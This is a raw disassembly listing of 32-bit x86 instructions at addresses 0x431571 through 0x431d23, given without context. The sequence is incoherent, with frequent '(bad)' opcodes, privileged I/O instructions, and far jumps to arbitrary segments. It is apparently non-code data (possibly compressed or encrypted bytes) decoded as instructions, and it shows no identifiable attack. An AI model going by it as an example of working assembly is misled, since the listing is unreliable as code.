  431571:	xor    edx,0x6f
  431574:	jbe    0x431581
  431576:	xchg   esi,eax
  431577:	inc    eax
  431578:	mov    al,ch
  43157a:	ret    0x34ab
  43157d:	xchg   DWORD PTR [esi-0x39],ebp
  431580:	fidivr DWORD PTR [esi+0x2b537f15]
  431586:	pop    edi
  431587:	xor    al,0xf4
  431589:	repz es pop ebp
  43158c:	(bad)  
  43158d:	push   esp
  43158e:	xchg   ebx,eax
  43158f:	adc    ch,ch
  431591:	mov    edi,0x61cf13dd
  431596:	cwde   
  431597:	cdq    
  431598:	lds    edx,FWORD PTR [eax+0x1be8f328]
  43159e:	faddp  st(7),st
  4315a0:	ins    BYTE PTR es:[edi],dx
  4315a1:	mov    ecx,0x3577ff52
  4315a6:	jmp    0x469a:0x57a2657e
  4315ad:	(bad)  
  4315ae:	es xchg ebp,eax
  4315b0:	clc    
  4315b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315b2:	adc    al,0x5e
  4315b4:	popf   
  4315b5:	int3   
  4315b6:	sub    DWORD PTR [edx-0x5f],edi
  4315b9:	jle    0x431612
  4315bb:	fisttp QWORD PTR [esi+0x756824d5]
  4315c1:	fcomp  QWORD PTR [edi-0x51]
  4315c4:	sbb    dl,ah
  4315c6:	sub    BYTE PTR [eax+0x6ad196a],al
  4315cc:	pusha  
  4315cd:	test   al,0x64
  4315cf:	add    dl,BYTE PTR [edi]
  4315d1:	(bad)  
  4315d2:	(bad)  
  4315d3:	shr    edx,cl
  4315d5:	push   0x2a02fd0f
  4315da:	push   ds
  4315db:	mov    al,ds:0x44b2b360
  4315e0:	dec    edx
  4315e1:	shr    BYTE PTR [edx+0x2b],0xfe
  4315e5:	inc    esi
  4315e6:	or     eax,0xaaa950d7
  4315eb:	outs   dx,BYTE PTR ds:[esi]
  4315ec:	std    
  4315ed:	jnp    0x431657
  4315ef:	lds    edx,FWORD PTR [edi-0x5185b61a]
  4315f5:	pop    eax
  4315f6:	iret   
  4315f7:	(bad)  
  4315f8:	xchg   edi,eax
  4315f9:	jg     0x431626
  4315fb:	jg     0x431630
  4315fd:	inc    edx
  4315fe:	dec    ebp
  4315ff:	clc    
  431600:	popa   
  431601:	mov    eax,ds:0xbf939bbf
  431606:	sti    
  431607:	xor    DWORD PTR [ebx-0x71],edx
  43160a:	sbb    eax,0x6c135aa3
  43160f:	jo     0x4315ee
  431611:	gs hlt 
  431613:	pop    esi
  431614:	jle    0x431649
  431616:	pop    ebp
  431617:	or     edi,DWORD PTR [edi-0x5a]
  43161a:	mov    edx,0xf1f02423
  43161f:	frstor [ebx+ecx*8+0x4ff3d225]
  431626:	xchg   ecx,eax
  431627:	leave  
  431628:	or     al,0x51
  43162a:	dec    ecx
  43162b:	sub    al,0x12
  43162d:	mov    esp,eax
  43162f:	lock les ebp,FWORD PTR [ebx-0x667b4988]
  431636:	popf   
  431637:	popf   
  431638:	(bad)  
  431639:	push   0xfffffff4
  43163b:	loopne 0x431634
  43163d:	mov    DWORD PTR cs:0x86285176,esp
  431644:	lock cli 
  431646:	ins    DWORD PTR es:[edi],dx
  431647:	ret    0xdff
  43164a:	cmp    BYTE PTR ds:0x2ffe5c61,bl
  431650:	aam    0xf3
  431652:	and    BYTE PTR ds:0xbc467250,al
  431658:	inc    edi
  431659:	jns    0x431689
  43165b:	cli    
  43165c:	push   edi
  43165d:	adc    edi,DWORD PTR [edx-0x2a]
  431660:	daa    
  431661:	push   ds
  431662:	xchg   ecx,eax
  431663:	pop    ss
  431664:	adc    al,0x84
  431666:	adc    BYTE PTR ds:0x6e6fcaf1,dh
  43166c:	adc    DWORD PTR [ebx],eax
  43166e:	xor    al,0x20
  431670:	jl     0x4316c2
  431672:	fidiv  WORD PTR [esi-0x4a2a9968]
  431678:	sbb    ecx,DWORD PTR [eax+0x47]
  43167b:	pop    edi
  43167c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43167d:	xchg   esp,eax
  43167e:	fimul  DWORD PTR [eax+0x46]
  431681:	mov    WORD PTR [ecx-0x12],es
  431684:	fld    DWORD PTR [edi]
  431686:	push   0x32dc2add
  43168b:	lods   eax,DWORD PTR ds:[esi]
  43168c:	jne    0x43168e
  43168e:	cmc    
  43168f:	loop   0x43167a
  431691:	outs   dx,BYTE PTR ds:[esi]
  431692:	ret    
  431693:	sub    dl,BYTE PTR fs:[ebx-0x33]
  431697:	pushf  
  431698:	pop    ss
  431699:	xchg   esp,eax
  43169a:	xor    DWORD PTR [esi-0x44],ecx
  43169d:	loop   0x431646
  43169f:	imul   eax,ebx,0xfdccc877
  4316a5:	aas    
  4316a6:	icebp  
  4316a7:	hlt    
  4316a8:	sbb    ecx,DWORD PTR [eax+0x2b94b347]
  4316ae:	push   ss
  4316af:	jl     0x4316b2
  4316b1:	icebp  
  4316b2:	xchg   esp,eax
  4316b3:	aad    0x18
  4316b5:	leave  
  4316b6:	xor    esp,ebx
  4316b8:	push   esp
  4316b9:	mov    ds:0x6c37d8a3,al
  4316be:	xchg   edx,eax
  4316bf:	sbb    eax,0x28a1d5af
  4316c4:	out    dx,al
  4316c5:	fwait
  4316c6:	lds    eax,FWORD PTR [eax-0x43]
  4316c9:	and    al,BYTE PTR [edx+0xbe7c519]
  4316cf:	jecxz  0x43173f
  4316d1:	mov    ebp,0xbc4d9f8b
  4316d6:	xchg   ebx,eax
  4316d7:	imul   edi,DWORD PTR [ebx-0x1e671d11],0xffffffeb
  4316de:	cmc    
  4316df:	jne    0x4316b4
  4316e1:	add    al,0x63
  4316e3:	dec    eax
  4316e4:	fild   WORD PTR [ebx-0xf6172d8]
  4316ea:	sub    DWORD PTR [edx],ebx
  4316ec:	mov    eax,gs:0x701c1a31
  4316f2:	xchg   ecx,eax
  4316f3:	inc    esi
  4316f4:	stos   BYTE PTR es:[edi],al
  4316f5:	scas   al,BYTE PTR es:[edi]
  4316f6:	mov    cl,BYTE PTR [esi]
  4316f8:	inc    edi
  4316f9:	cmc    
  4316fa:	scas   eax,DWORD PTR es:[edi]
  4316fb:	outs   dx,BYTE PTR ds:[esi]
  4316fc:	sbb    bh,bh
  4316fe:	gs cmc 
  431700:	imul   ebp,DWORD PTR [ecx],0xffffffc3
  431703:	scas   eax,DWORD PTR es:[edi]
  431704:	mov    edx,0x3166aac8
  431709:	in     eax,dx
  43170a:	xor    al,0x8e
  43170c:	mov    ch,bl
  43170e:	icebp  
  43170f:	sbb    al,0xfd
  431711:	call   0xcefb:0x88dbee6b
  431718:	pop    edi
  431719:	nop
  43171a:	mov    edi,0x730a1bf0
  43171f:	repz pop eax
  431721:	repnz push esi
  431723:	sub    al,0x76
  431725:	and    edi,ecx
  431727:	xor    edx,DWORD PTR [ebx-0x26ed7b2c]
  43172d:	mov    bh,0xbb
  43172f:	cmp    ch,dh
  431731:	iret   
  431732:	inc    edi
  431733:	icebp  
  431734:	or     eax,0x4d95c9fa
  431739:	cmp    bl,al
  43173b:	call   0xef14:0x1811cff7
  431742:	jp     0x431770
  431744:	dec    edi
  431745:	sub    al,0x2a
  431747:	mov    esi,0xc945367f
  43174c:	pop    esp
  43174d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43174e:	jae    0x43179f
  431750:	adc    ecx,ecx
  431752:	mov    eax,0x8474a055
  431757:	mov    ecx,0x177aa599
  43175c:	push   0x9d176d5b
  431761:	jno    0x4317a4
  431763:	push   ebx
  431764:	(bad)  
  431765:	out    0xc8,al
  431767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431768:	push   0xffffffac
  43176a:	jmp    0xeca:0x8fee932f
  431771:	or     sp,bx
  431774:	test   BYTE PTR [ebx],0xf1
  431777:	mov    esi,0x995f45e2
  43177c:	fs in  al,dx
  43177e:	dec    ebp
  43177f:	pop    edi
  431780:	(bad)  
  431781:	push   esp
  431782:	sub    BYTE PTR [ecx],dl
  431784:	stc    
  431785:	(bad)  
  431787:	mov    eax,0x21dfd3fc
  43178c:	cmp    esi,DWORD PTR [edx-0x61]
  43178f:	sbb    ch,ch
  431791:	ds xor ebp,0xc5fe91d7
  431798:	dec    edi
  431799:	dec    eax
  43179a:	jl     0x43178b
  43179c:	out    0x38,eax
  43179e:	(bad)  
  4317a0:	xor    bl,0xeb
  4317a3:	mov    edi,0x269e9b26
  4317a8:	aas    
  4317a9:	std    
  4317aa:	sbb    al,0xde
  4317ac:	shl    ebp,0xc4
  4317af:	dec    di
  4317b1:	arpl   WORD PTR [edx+0x264f49ba],bp
  4317b7:	jno    0x4317f0
  4317b9:	cmp    ebp,edx
  4317bb:	or     eax,0x79918d3d
  4317c0:	jb     0x4317bb
  4317c2:	mov    ah,BYTE PTR [eax+0x4e6c0eca]
  4317c8:	stos   DWORD PTR es:[edi],eax
  4317c9:	sub    ah,bh
  4317cb:	or     al,0x96
  4317cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317ce:	sub    dh,al
  4317d0:	retf   
  4317d1:	jp     0x4317fc
  4317d3:	(bad)  
  4317d4:	repz js 0x43178b
  4317d7:	es das 
  4317d9:	sub    BYTE PTR [edx],0xe2
  4317dc:	adc    edx,ebx
  4317de:	cmc    
  4317df:	bound  esp,QWORD PTR ds:0x834c2087
  4317e5:	cmp    BYTE PTR [edi],al
  4317e7:	lods   eax,DWORD PTR ds:[esi]
  4317e8:	inc    edx
  4317e9:	(bad)  
  4317ea:	fdivr  st,st(1)
  4317ec:	push   es
  4317ed:	(bad)  
  4317ef:	push   ss
  4317f0:	mov    esp,0xcfb0ef81
  4317f5:	repnz lock repnz xchg ecx,eax
  4317f9:	lods   al,BYTE PTR ds:[esi]
  4317fa:	stos   BYTE PTR es:[edi],al
  4317fb:	rcl    ah,0xf6
  4317fe:	in     eax,dx
  4317ff:	ret    
  431800:	mov    ecx,0xe77fc817
  431805:	and    DWORD PTR [esi],ecx
  431807:	jle    0x431808
  431809:	fistp  QWORD PTR [eax+0x3a]
  43180c:	xchg   ebx,eax
  43180d:	pop    edi
  43180e:	dec    esi
  43180f:	mov    ch,0xce
  431811:	call   0x680877b4
  431816:	aam    0xc0
  431818:	push   edi
  431819:	xchg   ebp,eax
  43181a:	shr    BYTE PTR [ebp+0x4ea8b99a],cl
  431820:	dec    ebp
  431821:	stos   BYTE PTR es:[edi],al
  431822:	sbb    dl,BYTE PTR [eax-0x73]
  431825:	add    dl,BYTE PTR [edi-0x7b]
  431828:	aas    
  431829:	push   0xffffffde
  43182b:	xchg   DWORD PTR [edx],ebx
  43182d:	repz out dx,al
  43182f:	shl    bh,cl
  431831:	js     0x431884
  431833:	and    DWORD PTR [eax],eax
  431835:	aad    0x8
  431837:	inc    esp
  431838:	ror    DWORD PTR [edx],0xd5
  43183b:	or     bh,BYTE PTR [ecx]
  43183d:	(bad)  
  43183e:	pop    edi
  43183f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431840:	mov    DWORD PTR [edx],ebp
  431842:	cwde   
  431843:	scas   eax,DWORD PTR es:[edi]
  431844:	std    
  431845:	out    0xd5,eax
  431847:	pop    edi
  431848:	les    esi,FWORD PTR [ebp+0x72b33e2]
  43184e:	push   eax
  43184f:	stos   BYTE PTR es:[edi],al
  431850:	rcl    cl,0xca
  431853:	add    BYTE PTR [edx+ecx*1-0x53d657c2],0x6a
  43185b:	test   BYTE PTR [eax+ecx*4-0x3a],dh
  43185f:	enter  0x4ba5,0x7a
  431863:	lods   al,BYTE PTR ds:[esi]
  431864:	add    al,0x7f
  431866:	clc    
  431867:	xor    eax,0xc4ea6fdc
  43186c:	cmp    al,0xe2
  43186e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43186f:	fcomp  QWORD PTR [edx+0x51b710a0]
  431875:	xor    edi,eax
  431877:	xor    BYTE PTR [ebx-0x4b],bl
  43187a:	push   esp
  43187b:	pop    esp
  43187c:	adc    DWORD PTR [esp+ecx*4-0x5c3b5cd0],ebx
  431883:	add    al,0x7a
  431885:	sti    
  431886:	pop    ecx
  431887:	retf   0x3275
  43188a:	cmp    eax,0x9b5630f2
  43188f:	inc    eax
  431890:	int3   
  431891:	ror    BYTE PTR [ecx],cl
  431893:	pop    esi
  431894:	cld    
  431895:	rol    DWORD PTR [edx],1
  431897:	fwait
  431898:	(bad)  
  431899:	call   0x88ab:0x52abac71
  4318a0:	popf   
  4318a1:	ss pop ecx
  4318a3:	jmp    0xad3332b0
  4318a8:	jmp    0xb466:0xcb771a23
  4318af:	mov    edx,esp
  4318b1:	gs mov cl,0x98
  4318b4:	add    eax,0x977d364a
  4318b9:	push   0x25
  4318bb:	or     ebp,0x43ec6568
  4318c1:	lahf   
  4318c2:	and    ch,dh
  4318c4:	mov    ebx,0x93b99667
  4318c9:	idiv   BYTE PTR [ebp+0x70]
  4318cc:	imul   BYTE PTR [ebx]
  4318ce:	push   esp
  4318cf:	ins    BYTE PTR es:[edi],dx
  4318d0:	fst    QWORD PTR [edx+ecx*1+0x3]
  4318d4:	mov    WORD PTR [ebx+esi*8],?
  4318d7:	push   es
  4318d8:	inc    ecx
  4318d9:	add    ch,BYTE PTR [esi+0x3c]
  4318dc:	add    DWORD PTR [edi],esp
  4318de:	or     esp,DWORD PTR [ebx+0xbaf0626]
  4318e4:	xchg   edx,eax
  4318e5:	sahf   
  4318e6:	cmp    eax,0x5dfda149
  4318eb:	mov    dl,0xb9
  4318ed:	fwait
  4318ee:	dec    eax
  4318ef:	or     eax,0xd833863f
  4318f4:	mov    dl,bh
  4318f6:	out    0x14,eax
  4318f8:	setno  BYTE PTR [esi]
  4318fb:	iret   
  4318fc:	pop    esi
  4318fd:	(bad)  
  4318fe:	ins    BYTE PTR es:[edi],dx
  4318ff:	xor    al,0x90
  431901:	das    
  431902:	inc    edi
  431903:	test   eax,0xd2cd3cce
  431908:	test   DWORD PTR [ebp-0x7020a07c],ebx
  43190e:	ret    
  43190f:	es mov al,0x32
  431912:	pop    ecx
  431913:	ret    0x958
  431916:	xchg   edx,eax
  431917:	int    0xcd
  431919:	adc    ch,BYTE PTR [eax-0x27]
  43191c:	inc    ecx
  43191d:	ds lahf 
  43191f:	and    BYTE PTR [esi+0x1da1c51e],bl
  431925:	lea    edx,[ebp-0x423d7b75]
  43192b:	mov    dl,0x70
  43192d:	push   cs
  43192e:	mov    WORD PTR [edx],es
  431930:	stc    
  431931:	add    ebp,DWORD PTR ds:0x7362c4ad
  431937:	int3   
  431938:	int3   
  431939:	pushf  
  43193a:	adc    DWORD PTR [ebx-0x56566249],eax
  431940:	jnp    0x4318fa
  431942:	(bad)  
  431943:	(bad)  
  431944:	add    ebx,DWORD PTR [eax-0x31c10022]
  43194a:	(bad)  
  43194b:	out    0xf1,eax
  43194d:	in     eax,0xb4
  43194f:	loopne 0x431905
  431951:	cs sub al,0x4b
  431954:	xor    al,0x82
  431956:	or     BYTE PTR [ecx],0x7d
  431959:	int    0x57
  43195b:	jbe    0x43194a
  43195d:	push   ecx
  43195e:	jo     0x43193f
  431960:	test   eax,0x88095e7f
  431965:	xor    bh,dh
  431967:	call   0xfaad:0xcaea8f12
  43196e:	add    eax,0x567dde68
  431973:	push   edi
  431974:	jp     0x43192b
  431976:	ja     0x431962
  431978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431979:	inc    edi
  43197a:	mov    ebx,0xac02968e
  43197f:	popf   
  431980:	adc    al,0xac
  431982:	cli    
  431983:	loope  0x431964
  431985:	loop   0x431980
  431987:	hlt    
  431988:	popf   
  431989:	cmc    
  43198a:	fstp   QWORD PTR [esi-0x4]
  43198d:	lahf   
  43198e:	iret   
  43198f:	rcl    esp,1
  431991:	mov    edx,0x5a33d49d
  431996:	jbe    0x4319ff
  431998:	lea    ecx,[edx-0x61b0e02a]
  43199e:	int3   
  43199f:	fisubr DWORD PTR [edi+0x62]
  4319a2:	dec    ecx
  4319a3:	mov    esp,0x6073936
  4319a8:	fwait
  4319a9:	xchg   ecx,eax
  4319aa:	stc    
  4319ab:	inc    ebx
  4319ac:	inc    edx
  4319ad:	or     eax,esp
  4319af:	push   ebx
  4319b0:	push   0xaebb334d
  4319b5:	outs   dx,DWORD PTR ds:[esi]
  4319b6:	arpl   sp,sp
  4319b8:	das    
  4319b9:	push   ecx
  4319ba:	in     al,dx
  4319bb:	loope  0x4319d9
  4319bd:	push   es
  4319be:	loope  0x431997
  4319c0:	pop    edx
  4319c1:	mov    bh,0x64
  4319c3:	and    DWORD PTR [edi-0x60408267],0xffffffa6
  4319ca:	out    0x5a,eax
  4319cc:	xor    esp,esp
  4319ce:	pop    ebp
  4319cf:	fwait
  4319d0:	adc    eax,eax
  4319d2:	inc    esp
  4319d3:	enter  0x149f,0x59
  4319d7:	test   al,0x92
  4319d9:	sub    ecx,DWORD PTR [edx+ecx*1+0x7d0a2e6c]
  4319e0:	pop    ds
  4319e1:	daa    
  4319e2:	jbe    0x4319c0
  4319e4:	inc    esp
  4319e5:	loopne 0x43197d
  4319e7:	scas   eax,DWORD PTR es:[edi]
  4319e8:	loope  0x431a57
  4319ea:	pop    edi
  4319eb:	dec    ebx
  4319ec:	cs call 0x717:0x5dfd7c61
  4319f4:	mov    al,0xfe
  4319f6:	dec    BYTE PTR [ebx-0x54]
  4319f9:	mov    ebx,0x862a0ae2
  4319fe:	and    ecx,ebx
  431a00:	xchg   ebx,eax
  431a01:	add    DWORD PTR [ecx-0x4e],edi
  431a04:	sar    BYTE PTR ds:[edi-0x9],cl
  431a08:	jle    0x431a42
  431a0a:	jne    0x43198e
  431a0c:	fdiv   st(7),st
  431a0e:	mov    ebx,0x3725d713
  431a13:	xchg   ebx,eax
  431a14:	retf   
  431a15:	push   ds
  431a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a17:	push   edx
  431a18:	xchg   ecx,eax
  431a19:	out    0x70,eax
  431a1b:	addr16 sub esi,eax
  431a1e:	ror    ah,cl
  431a20:	(bad)  
  431a21:	in     al,0x69
  431a23:	adc    edi,esi
  431a25:	pop    esi
  431a26:	xor    eax,0xa8d4818
  431a2b:	mov    ebp,0x59900ceb
  431a30:	int3   
  431a31:	popa   
  431a32:	adc    eax,0x8ede794
  431a37:	nop
  431a38:	cmp    BYTE PTR [edx+ecx*2],dh
  431a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431a3c:	rol    DWORD PTR [edi+0x84b5a6d],cl
  431a42:	ficom  DWORD PTR [edi+eax*2+0xe]
  431a46:	pop    ecx
  431a47:	loope  0x431aba
  431a49:	ficomp WORD PTR [esi+0x36a62c3e]
  431a4f:	loop   0x431a34
  431a51:	inc    edi
  431a52:	pop    eax
  431a53:	jb     0x431a19
  431a55:	jmp    0xe6865794
  431a5a:	mov    cl,BYTE PTR [edi]
  431a5c:	sar    ch,1
  431a5e:	xchg   BYTE PTR [edi],ch
  431a60:	icebp  
  431a61:	retf   
  431a62:	cdq    
  431a63:	add    al,0xed
  431a65:	aad    0x46
  431a67:	out    0xa6,al
  431a69:	mov    cl,al
  431a6b:	imul   edi,edx,0xfffffff6
  431a6e:	test   eax,0x790fedf
  431a73:	aas    
  431a74:	std    
  431a75:	mov    edi,0x5f14b339
  431a7a:	outs   dx,BYTE PTR ds:[esi]
  431a7b:	pop    edx
  431a7c:	push   edx
  431a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431a7e:	push   ecx
  431a7f:	mov    esi,0x9c11a31d
  431a84:	scas   eax,DWORD PTR es:[edi]
  431a85:	shr    al,cl
  431a87:	add    BYTE PTR ds:0x2af7718d,cl
  431a8d:	xor    DWORD PTR [ebx-0x63],ecx
  431a90:	fidivr WORD PTR [ecx-0x548b5b98]
  431a96:	xchg   esi,eax
  431a97:	pusha  
  431a98:	push   0x1a
  431a9a:	xchg   edx,eax
  431a9b:	inc    edx
  431a9c:	pmaddwd mm0,QWORD PTR [esi+0x18fd6120]
  431aa3:	mov    al,0x4c
  431aa5:	jecxz  0x431ad3
  431aa7:	push   ecx
  431aa8:	adc    eax,0x8260a892
  431aad:	or     BYTE PTR [esi],0x2a
  431ab0:	aas    
  431ab1:	inc    eax
  431ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431ab3:	sub    DWORD PTR [edx-0x3755659f],0x40
  431aba:	popf   
  431abb:	cmp    eax,0x84a1ce2a
  431ac0:	dec    esi
  431ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431ac2:	sbb    eax,0xa2a7ffaa
  431ac7:	iret   
  431ac8:	lods   eax,DWORD PTR ds:[esi]
  431ac9:	xor    al,0x1a
  431acb:	pop    DWORD PTR [eax+ebp*2+0xfef91f4]
  431ad2:	cmp    ebp,eax
  431ad4:	stc    
  431ad5:	scas   eax,DWORD PTR es:[edi]
  431ad6:	pop    ds
  431ad7:	loope  0x431a97
  431ad9:	inc    BYTE PTR [esi]
  431adb:	retf   0xbf0b
  431ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431adf:	out    0xbf,al
  431ae1:	mov    DWORD PTR [ecx-0x376400a9],ecx
  431ae7:	fadd   QWORD PTR ds:0x8c2eda51
  431aed:	ret    0xda8f
  431af0:	push   cs
  431af1:	cmp    al,0x47
  431af3:	repz pop ss
  431af5:	pop    ebp
  431af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431af7:	or     ebx,DWORD PTR [edi+0x11]
  431afa:	push   cs
  431afb:	jbe    0x431b47
  431afd:	mov    eax,0x8a9433f9
  431b02:	inc    ebx
  431b03:	and    al,0x9e
  431b05:	pop    ds
  431b06:	adc    ecx,DWORD PTR [edx]
  431b08:	pusha  
  431b09:	and    bl,BYTE PTR [edx+0x77936f12]
  431b0f:	shl    BYTE PTR [edx+0x56ba6041],cl
  431b15:	sbb    ch,0xe1
  431b18:	(bad)  
  431b19:	(bad)  
  431b1b:	(bad)  
  431b1c:	fist   DWORD PTR [edi]
  431b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431b1f:	push   edx
  431b20:	mov    BYTE PTR cs:[edi-0x4b],ah
  431b24:	retf   0xbf8b
  431b27:	pop    ds
  431b28:	fwait
  431b29:	lods   eax,DWORD PTR ds:[esi]
  431b2a:	push   ebp
  431b2b:	cmp    BYTE PTR [ecx-0x201d87f],ah
  431b31:	push   ecx
  431b32:	pop    edx
  431b33:	ds not ebp
  431b36:	gs push cs
  431b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431b39:	mov    ebp,0xbfbf25e7
  431b3e:	adc    esp,0x35
  431b41:	xchg   edi,eax
  431b42:	mov    BYTE PTR [edx+0x1ff8e16e],dh
  431b48:	fiadd  WORD PTR [ebx-0x5]
  431b4b:	pop    edx
  431b4c:	mulps  xmm6,XMMWORD PTR [ecx-0x5054b208]
  431b53:	ret    
  431b54:	push   eax
  431b55:	ds dec esp
  431b57:	cmp    BYTE PTR fs:[ecx+0x78],al
  431b5b:	sti    
  431b5c:	fstp   QWORD PTR [eax-0x33]
  431b5f:	xchg   ecx,ecx
  431b61:	sbb    bh,bl
  431b63:	sub    al,0x2
  431b65:	cmp    DWORD PTR [ebp-0x2adbdfb1],eax
  431b6b:	add    eax,0xccd915cc
  431b70:	je     0x431bbb
  431b72:	scas   al,BYTE PTR es:[edi]
  431b73:	sub    eax,0x8da0a8c6
  431b78:	jg     0x431b58
  431b7a:	leave  
  431b7b:	push   esp
  431b7c:	in     eax,0x0
  431b7e:	jge    0x431b9d
  431b80:	fwait
  431b81:	test   eax,0xef75c319
  431b86:	lahf   
  431b87:	retf   0x845
  431b8a:	js     0x431bc2
  431b8c:	xchg   edx,eax
  431b8d:	sub    cl,BYTE PTR [edx]
  431b8f:	or     eax,0x15eac929
  431b94:	(bad)  
  431b98:	mov    cl,0x38
  431b9a:	xor    dh,BYTE PTR [ebp+esi*2-0x15ab6a84]
  431ba1:	inc    edi
  431ba2:	and    bl,BYTE PTR [ecx+ebp*1+0x41]
  431ba6:	sub    ebx,esi
  431ba8:	cli    
  431ba9:	inc    edx
  431baa:	dec    edi
  431bab:	mov    esp,esp
  431bad:	lods   al,BYTE PTR ds:[esi]
  431bae:	(bad)  [eax-0x5b]
  431bb1:	sbb    BYTE PTR [ebx+0x1aa6dc16],cl
  431bb7:	jmp    0x8adf594a
  431bbc:	xchg   ebp,eax
  431bbd:	jmp    0x3bc5:0x1a49c0c1
  431bc4:	addr16 push edi
  431bc6:	pop    eax
  431bc7:	jnp    0x431c46
  431bc9:	cld    
  431bca:	fidiv  WORD PTR [edx-0x49]
  431bcd:	pop    esi
  431bce:	lds    esp,FWORD PTR ds:0x85602d15
  431bd4:	mov    bh,0x50
  431bd6:	mov    es,WORD PTR [eax]
  431bd8:	sbb    dl,ch
  431bda:	mov    eax,ds:0x6285e7da
  431bdf:	xlat   BYTE PTR ds:[ebx]
  431be0:	test   eax,0x7ef9f69f
  431be5:	sbb    ah,BYTE PTR [edi-0x37]
  431be8:	popa   
  431be9:	sbb    eax,0x60346835
  431bee:	loopne 0x431c03
  431bf0:	outs   dx,DWORD PTR ds:[esi]
  431bf1:	and    al,0xf8
  431bf3:	jecxz  0x431c64
  431bf5:	xlat   BYTE PTR ds:[ebx]
  431bf6:	out    dx,eax
  431bf7:	push   esi
  431bf8:	cdq    
  431bf9:	cli    
  431bfa:	adc    ebp,DWORD PTR [ecx-0x171ed043]
  431c00:	call   0x88fbcea6
  431c05:	mov    eax,ds:0x99359e45
  431c0a:	adc    BYTE PTR ds:0x6f12634a,ah
  431c10:	jmp    0x3a4cd002
  431c15:	enter  0x7f31,0x20
  431c19:	push   ebx
  431c1a:	scas   eax,DWORD PTR es:[edi]
  431c1b:	(bad)  
  431c1c:	imul   edi,DWORD PTR [edi-0x628fbe36],0xffffff85
  431c23:	inc    edx
  431c24:	retf   0xd1c4
  431c27:	jnp    0x431c0c
  431c29:	js     0x431ca5
  431c2b:	in     al,dx
  431c2c:	inc    edx
  431c2d:	xchg   ecx,eax
  431c2e:	ins    BYTE PTR es:[edi],dx
  431c2f:	add    al,0x7
  431c31:	int3   
  431c32:	int3   
  431c33:	push   ds
  431c34:	shl    DWORD PTR [esi-0x18],1
  431c37:	push   ebp
  431c38:	imul   ebp,ecx,0x7970dad4
  431c3e:	jo     0x431c19
  431c40:	or     eax,DWORD PTR [edx-0x47]
  431c43:	stos   BYTE PTR es:[edi],al
  431c44:	fcomp  DWORD PTR [ebx+0x43]
  431c47:	inc    esp
  431c48:	push   cs
  431c49:	push   ds
  431c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431c4b:	sub    al,0x2f
  431c4d:	xor    edi,DWORD PTR [esi-0x931cb09]
  431c53:	data16 fcmovu st,st(6)
  431c56:	test   BYTE PTR ds:0x232fdb9a,0x3b
  431c5d:	jno    0x431be7
  431c5f:	mov    ebp,ebp
  431c61:	lahf   
  431c62:	pop    edx
  431c63:	out    0xb9,al
  431c65:	mov    ebp,0x7b1fbccf
  431c6a:	dec    edi
  431c6b:	cmp    esp,DWORD PTR [esi]
  431c6d:	retf   
  431c6e:	es dec esp
  431c70:	mov    ecx,0x7c1ff226
  431c75:	aaa    
  431c76:	(bad)  
  431c77:	cmp    eax,0xf81fca16
  431c7c:	mov    eax,ds:0x4927e318
  431c81:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  431c83:	jmp    0xe8d4cd67
  431c88:	cld    
  431c89:	cmp    DWORD PTR [ecx],edx
  431c8b:	jl     0x431ca4
  431c8d:	in     eax,0x44
  431c8f:	or     DWORD PTR [ebx-0x5931d125],edi
  431c95:	retf   0x99fc
  431c98:	sub    DWORD PTR [edx+0x4d520fb7],edi
  431c9e:	or     ecx,DWORD PTR [ebp+0x16638859]
  431ca4:	js     0x431d04
  431ca6:	sub    ecx,DWORD PTR [ecx]
  431ca8:	dec    ebp
  431ca9:	aad    0x6
  431cab:	pushf  
  431cac:	call   0x998a:0xb8af846b
  431cb3:	push   edi
  431cb4:	dec    esi
  431cb5:	push   edx
  431cb6:	retf   0xb157
  431cb9:	test   BYTE PTR [ebp-0x8],cl
  431cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cbd:	(bad)  
  431cbe:	enter  0x101c,0xd5
  431cc2:	mov    ch,0x1a
  431cc4:	jno    0x431d45
  431cc6:	loop   0x431c6f
  431cc8:	cmp    BYTE PTR [esi+eax*1],bl
  431ccb:	or     al,0xf7
  431ccd:	jg     0x431c69
  431ccf:	std    
  431cd0:	lahf   
  431cd1:	cmp    BYTE PTR [edx+0xf],bl
  431cd4:	fsubr  DWORD PTR [edx+0x2850d5c]
  431cda:	xchg   esp,eax
  431cdb:	push   edx
  431cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cdd:	imul   ecx,DWORD PTR [edi+ebp*4+0x2afb3953],0x810ca376
  431ce8:	sub    ah,al
  431cea:	push   ecx
  431ceb:	daa    
  431cec:	je     0x431cd8
  431cee:	ja     0x431d05
  431cf0:	fst    DWORD PTR [edi-0x1d]
  431cf3:	ficom  WORD PTR [ecx+esi*2-0x61]
  431cf7:	cmp    dl,ch
  431cf9:	push   edx
  431cfa:	je     0x431d3c
  431cfc:	popf   
  431cfd:	repnz test eax,0x808397df
  431d03:	sub    al,BYTE PTR [eax+0x6344d0]
  431d09:	fs jbe 0x431cd1
  431d0c:	inc    ebp
  431d0d:	push   ebp
  431d0e:	sub    ah,BYTE PTR [ecx-0x7dadf5c6]
  431d14:	mov    ds:0x1a0abbbc,al
  431d19:	test   eax,0x4c7513c4
  431d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d1f:	cmp    ch,ch
  431d21:	test   al,0x20
  431d23:	mov    ds:0x555739ca,eax
